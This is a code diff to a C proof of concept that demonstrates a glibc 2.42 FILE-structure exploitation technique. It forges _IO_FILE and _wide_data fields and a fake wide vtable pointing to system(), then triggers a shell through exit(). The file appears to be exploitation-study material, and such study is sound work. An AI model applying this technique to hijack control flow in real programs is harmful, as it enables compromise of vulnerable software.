@@ -1,3 +1,6 @@
+// glibc 2.42
+// https://github.com/nosurfer
+
 #include <stdio.h>
 #include <stdlib.h>
 
@@ -14,20 +17,19 @@ int main() {
     char *wide_vtable = calloc(0x200, 1);
 
     // _wide_data
-    *(size_t *)(wide_data + 0x20) = (size_t) 0x1;
     *(size_t *)(wide_data + 0xe0) = (size_t) wide_vtable;
     
     // _IO_2_1_stdout_
-    *(size_t *)(stderr2) = (size_t) 0x687320; // /bin/sh\x00
-    *(size_t *)(stderr2 + 0xd8) = (size_t) _IO_wfile_jumps_addr + 0x40 - 0x10 ; // offset of seekof
+    *(size_t *)(stderr2) = (size_t) 0x687320; // \x20sh
+    *(size_t *)(stderr2 + 0xd8) = (size_t) _IO_wfile_jumps_addr; // offset of seekof
     *(size_t *)(stderr2 + 0xa0) = (size_t) wide_data;
     // _IO_flush_all: fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base
-    *(int    *)(stderr2 + 0xc0) = (int) 0; // _mode
-    *(size_t *)(stderr2 + 0x28) = (size_t) 1; // _IO_write_ptr
+    // *(int    *)(stderr2 + 0xc0) = (int) 0; // _mode
+    // *(size_t *)(stderr2 + 0x28) = (size_t) 1; // _IO_write_ptr
     *(size_t *)(stderr2 + 0x20) = (size_t) 0; // _IO_write_base
 
     // _wide_data->vtable
-    *(size_t *)(wide_vtable + 0x18) = (size_t) &system;
+    *(size_t *)(wide_vtable + 0x68) = (size_t) &system;
 
     exit(0);
 }
